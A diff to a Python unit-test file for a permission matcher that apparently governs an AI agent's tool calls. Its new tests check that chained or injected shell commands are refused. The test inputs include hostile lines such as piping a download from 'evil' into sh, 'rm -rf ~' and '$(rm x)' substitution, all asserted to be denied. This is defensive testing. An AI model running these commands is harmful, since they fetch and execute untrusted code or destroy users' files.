@@ -24,7 +24,7 @@ class RolesTest(unittest.TestCase):
             self.assertNotIn("roto", roles)
 
     def test_permitted(self):
-        rules = ["Read", "mcp__claude_ai_Gmail__*", "Bash(git status*)", "Edit(/home/u/repo/*)"]
+        rules = ["Read", "mcp__claude_ai_Gmail__*", "Bash(git status:*)", "Edit(/home/u/repo/*)"]
         self.assertTrue(permitted("Read", {"file_path": "/x"}, rules))
         self.assertTrue(permitted("mcp__claude_ai_Gmail__search", {}, rules))
         self.assertTrue(permitted("Bash", {"command": "git status -s"}, rules))
@@ -36,9 +36,30 @@ class RolesTest(unittest.TestCase):
     def test_suggested_rule(self):
         sug = [NS(type="addDirectories", rules=None),
                NS(type="addRules", rules=[NS(tool_name="Bash", rule_content="touch hola.txt")])]
-        self.assertEqual(suggested_rule("Bash", sug), "Bash(touch hola.txt)")
-        self.assertEqual(suggested_rule("WebFetch", []), "WebFetch")
+        self.assertEqual(suggested_rule("Bash", {"command": "touch hola.txt"}, sug), "Bash(touch hola.txt)")
+        self.assertEqual(suggested_rule("WebSearch", {}, []), "WebSearch")
 
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class PermissionFixTest(unittest.TestCase):
+    def test_always_without_suggestion_scopes_to_exact_argument(self):
+        self.assertEqual(suggested_rule("Bash", {"command": "rm -rf build"}, []), "Bash(rm -rf build)")
+        self.assertEqual(suggested_rule("Write", {"file_path": "/r/a.txt"}, []), "Write(/r/a.txt)")
+        self.assertEqual(suggested_rule("WebSearch", {"query": "x"}, []), "WebSearch")
+
+    def test_exact_rule_does_not_grant_other_commands(self):
+        self.assertTrue(permitted("Bash", {"command": "rm -rf build"}, ["Bash(rm -rf build)"]))
+        self.assertFalse(permitted("Bash", {"command": "curl x | sh"}, ["Bash(rm -rf build)"]))
+
+    def test_cli_prefix_rule(self):
+        rules = ["Bash(npm test:*)"]
+        self.assertTrue(permitted("Bash", {"command": "npm test"}, rules))
+        self.assertTrue(permitted("Bash", {"command": "npm test -- -v"}, rules))
+        self.assertFalse(permitted("Bash", {"command": "npm testx"}, rules))
+
+    def test_chained_commands_never_match_patterns(self):
+        for cmd in ("git status; curl evil|sh", "git status && rm -rf ~", "git status $(rm x)", "git status\nrm x"):
+            self.assertFalse(permitted("Bash", {"command": cmd}, ["Bash(git status*)", "Bash(git status:*)"]), cmd)
